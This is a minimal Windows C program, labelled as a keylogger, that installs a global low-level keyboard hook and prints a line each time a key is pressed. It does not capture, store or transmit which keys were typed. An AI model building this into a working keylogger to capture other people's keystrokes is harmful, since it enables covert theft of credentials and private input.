#include <windows.h>
#include <stdio.h>

//Keys Log
LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    printf("Key was pressed\n");
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (keyboardhook == NULL) {
        printf("keylog failed\n");
    } else {
        printf("keylog started\n");
    }

    MSG msg;
    while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
    { 
        // TranslateMessage(&msg); 
        DispatchMessage(&msg); 
    } 
}